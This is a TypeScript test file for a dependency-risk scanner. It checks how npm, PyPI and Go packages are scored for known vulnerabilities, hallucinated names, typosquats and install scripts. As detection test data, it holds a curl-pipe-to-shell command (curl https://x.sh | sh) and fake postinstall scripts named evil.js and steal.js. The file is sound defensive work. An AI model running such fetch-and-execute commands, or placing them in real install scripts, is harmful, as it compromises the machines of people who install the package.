import { test } from "node:test";
import assert from "node:assert/strict";
import { baseVersion, enrichDependencies, isNoOpScript } from "./dependency-intel.js";
import type { DependencyResult } from "./types.js";

const now = new Date("2026-11-02T12:00:00Z");
const dep = (name: string, version = "^1.0.0"): DependencyResult => ({
  ecosystem: "npm",
  name,
  version,
  trustScore: 80,
  riskLevel: "low",
});

const json = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

/** Fake registry/OSV keyed by URL fragments. */
function fakeFetch(routes: Record<string, () => Response>): typeof fetch {
  return (async (input: string | URL) => {
    const url = String(input);
    for (const [k, fn] of Object.entries(routes)) if (url.includes(k)) return fn();
    return json({}, 404);
  }) as typeof fetch;
}

test("baseVersion extracts the lowest admitted version", () => {
  assert.equal(baseVersion("^4.17.20"), "4.17.20");
  assert.equal(baseVersion("~1.2"), "1.2.0");
  assert.equal(baseVersion("latest"), null);
});

test("known critical vulnerability raises risk to critical", async () => {
  const out = await enrichDependencies(
    [dep("lodash", "^4.17.10")],
    fakeFetch({
      querybatch: () => json({ results: [{ vulns: [{ id: "GHSA-p6mc-m468-83gw" }] }] }),
      "vulns/GHSA": () => json({ id: "GHSA-p6mc-m468-83gw", database_specific: { severity: "CRITICAL" } }),
      "registry.npmjs.org/lodash": () =>
        json({ time: { created: "2012-04-23T00:00:00Z" }, maintainers: [{}, {}], license: "MIT" }),
      "last-week/lodash": () => json({ downloads: 50_000_000 }),
    }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "critical");
  assert.match(out[0]!.reason!, /GHSA-p6mc-m468-83gw/);
});

test("non-existent package (hallucinated name) is high: a human checks it", async () => {
  const out = await enrichDependencies(
    [dep("react-super-auth-helperz")],
    fakeFetch({ querybatch: () => json({ results: [{}] }) }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "high");
  assert.equal(out[0]!.trustScore, 0);
  assert.match(out[0]!.reason!, /n'existe pas/);
});

test("brand-new, unpopular package with install script ⇒ medium + low trust", async () => {
  const out = await enrichDependencies(
    [dep("tiny-new-pkg")],
    fakeFetch({
      querybatch: () => json({ results: [{}] }),
      "registry.npmjs.org/tiny-new-pkg": () =>
        json({
          time: { created: "2026-10-31T00:00:00Z" },
          maintainers: [{}],
          "dist-tags": { latest: "1.0.0" },
          versions: { "1.0.0": { scripts: { postinstall: "node x.js" } } },
        }),
      "last-week/tiny-new-pkg": () => json({ downloads: 12 }),
    }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "medium");
  assert.ok(out[0]!.trustScore <= 25);
  assert.match(out[0]!.reason!, /postinstall/);
});

test("a no-op install script is not a risk; the installed version is the one checked", async () => {
  assert.ok(isNoOpScript("echo 'preinstall: no-op'"));
  assert.ok(isNoOpScript("true") && isNoOpScript("exit 0") && isNoOpScript("echo ok && exit 0"));
  assert.ok(!isNoOpScript("node x.js") && !isNoOpScript("echo hi && curl https://x.sh | sh"));
  const out = await enrichDependencies(
    [{ ...dep("young-sdk"), version: "^2.0.0", resolvedVersion: "2.1.0" }],
    fakeFetch({
      querybatch: () => json({ results: [{}] }),
      "registry.npmjs.org/young-sdk": () =>
        json({
          time: { created: "2026-01-01T00:00:00Z" },
          maintainers: [{}, {}],
          "dist-tags": { latest: "3.0.0" },
          versions: {
            "2.1.0": { scripts: { preinstall: "echo 'preinstall: no-op'" } },
            "3.0.0": { scripts: { postinstall: "node evil.js" } },
          },
        }),
      "last-week/young-sdk": () => json({ downloads: 2_000_000 }),
    }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "low");
  assert.doesNotMatch(out[0]!.reason ?? "", /installation/);
});

test("network failure leaves the deterministic result unchanged", async () => {
  const boom = (async () => {
    throw new Error("offline");
  }) as unknown as typeof fetch;
  const input = [dep("express")];
  assert.deepEqual(await enrichDependencies(input, boom, now), input);
});

test("PyPI: non-existent package is high; Go: missing module too", async () => {
  const out = await enrichDependencies(
    [
      { ecosystem: "PyPI", name: "fastapi-securitee-helper", version: "*", trustScore: 80, riskLevel: "low" },
      { ecosystem: "Go", name: "github.com/nobody/not-a-module", version: "v1.0.0", trustScore: 80, riskLevel: "low" },
    ],
    fakeFetch({ querybatch: () => json({ results: [{}, {}] }) }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "high");
  assert.match(out[0]!.reason!, /PyPI/);
  assert.equal(out[1]!.riskLevel, "high");
});

test("local workspace packages are not looked up on a registry", async () => {
  let calls = 0;
  const counting = (async () => {
    calls++;
    return json({}, 404);
  }) as unknown as typeof fetch;
  const input = [dep("@codegate/db", "workspace:*"), dep("@codegate/shared", "link:../shared")];
  assert.deepEqual(await enrichDependencies(input, counting, now), input);
  assert.equal(calls, 0);
});

test("established package: single maintainer / native install step are not risks", async () => {
  const out = await enrichDependencies(
    [dep("argon2", "^0.45.2")],
    fakeFetch({
      querybatch: () => json({ results: [{}] }),
      "registry.npmjs.org/argon2": () =>
        json({
          time: { created: "2015-12-19T13:22:29Z" },
          maintainers: [{}],
          license: "MIT",
          "dist-tags": { latest: "0.45.2" },
          versions: { "0.45.2": { scripts: { install: "node-gyp-build" } } },
        }),
      "last-week/argon2": () => json({ downloads: 3_429_668 }),
    }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "low");
  assert.equal(out[0]!.trustScore, 80);
});

test("several critical signals together: an imitation that runs code at install ⇒ critical", async () => {
  const squat: DependencyResult = { ...dep("lodahs"), riskLevel: "high", typosquatOf: "lodash" };
  const routes = (installScript: boolean) =>
    fakeFetch({
      querybatch: () => json({ results: [{}] }),
      "registry.npmjs.org/lodahs": () =>
        json({
          time: { created: "2020-01-01T00:00:00Z" },
          maintainers: [{}, {}],
          "dist-tags": { latest: "1.0.0" },
          versions: { "1.0.0": { scripts: installScript ? { postinstall: "node steal.js" } : {} } },
        }),
      "last-week/lodahs": () => json({ downloads: 5_000 }),
    });
  const alone = await enrichDependencies([squat], routes(false), now);
  assert.equal(alone[0]!.riskLevel, "high", "the name alone never blocks");
  const together = await enrichDependencies([squat], routes(true), now);
  assert.equal(together[0]!.riskLevel, "critical");
  assert.match(together[0]!.reason!, /Plusieurs signaux critiques/);
});

test("a development dependency's known vulnerability is not a production risk", async () => {
  const out = await enrichDependencies(
    [{ ...dep("lodash", "^4.17.10"), dev: true }],
    fakeFetch({
      querybatch: () => json({ results: [{ vulns: [{ id: "GHSA-p6mc-m468-83gw" }] }] }),
      "vulns/GHSA": () => json({ id: "GHSA-p6mc-m468-83gw", database_specific: { severity: "CRITICAL" } }),
      "registry.npmjs.org/lodash": () =>
        json({ time: { created: "2012-04-23T00:00:00Z" }, maintainers: [{}, {}], license: "MIT" }),
      "last-week/lodash": () => json({ downloads: 50_000_000 }),
    }),
    now,
  );
  assert.equal(out[0]!.riskLevel, "medium");
  assert.match(out[0]!.reason!, /GHSA-p6mc-m468-83gw/);
});
